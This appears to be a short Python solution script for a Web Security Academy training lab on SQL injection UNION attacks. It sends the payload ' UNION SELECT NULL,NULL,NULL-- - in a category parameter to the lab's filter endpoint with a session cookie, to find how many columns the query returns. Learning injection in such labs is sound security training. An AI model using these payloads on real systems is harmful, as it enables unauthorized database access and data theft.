# Lab: SQL injection UNION attack, determining the number of columns 
# returned by the query

import requests

url = "https://0af0007104a24497c0597089001d008d.web-security-academy.net/"
cookies = {
	"session": "0eFjY9EQZ88UDhcw6GCuiLSTFvo18LMD"
}

params = {
	"category": "' UNION SELECT NULL,NULL,NULL-- -"
}
r = requests.get(url + "filter", params=params, cookies=cookies)
print(r.status_code)
# print(r.text)